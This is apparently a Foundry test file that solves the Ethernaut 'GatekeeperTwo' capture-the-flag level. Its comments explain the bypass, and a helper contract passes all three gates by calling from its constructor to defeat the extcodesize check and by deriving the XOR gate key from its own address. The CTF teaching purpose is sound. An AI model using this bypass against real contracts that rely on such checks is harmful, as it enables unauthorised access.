// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";

import "../levels/14-GatekeeperTwo/GatekeeperTwoFactory.sol";
import "../core/Ethernaut.sol";

contract GatekeeperTwoTest is Test {
    Ethernaut ethernaut;
    address attacker = makeAddr("attacker");

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testGatekeeperTwoHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        GatekeeperTwoFactory gatekeeperTwoFactory = new GatekeeperTwoFactory();
        ethernaut.registerLevel(gatekeeperTwoFactory);
        vm.startPrank(attacker, attacker); // origin has its importance in this challenge
        address levelAddress = ethernaut.createLevelInstance(gatekeeperTwoFactory);
        GatekeeperTwo ethernautGatekeeperTwo = GatekeeperTwo(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // First gate
        // msg.sender != tx.origin so it cannot be an EOA
        //
        // Second gate
        // extcodesize(caller()) == 0
        // caller returns the call sender
        // extcodesize returns the size of the code at the specified address
        // see https://docs.soliditylang.org/en/latest/yul.html
        // Here it enforces that no code should reside at the caller address
        // hence it needs to be an EOA OR when calling an other contract from a contructor
        // the caller does not have code yet. By taking into account first gate, it is the second case
        // see https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/extcodesize-checks/
        //
        // Third gate
        // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max
        // ^ is a bitwise XOR, exclusive OR operation
        //    0101
        //XOR 0011
        //  = 0110
        // As it is exlusive or: a xor c = b and b xor c = a
        // So type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) == uint64(_gateKey)

        new GatekeeperTwoCaller(ethernautGatekeeperTwo);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract GatekeeperTwoCaller {
    constructor(GatekeeperTwo gatekeeperTwo) {
        bytes8 gateKey = bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        gatekeeperTwo.enter(gateKey);
    }
}
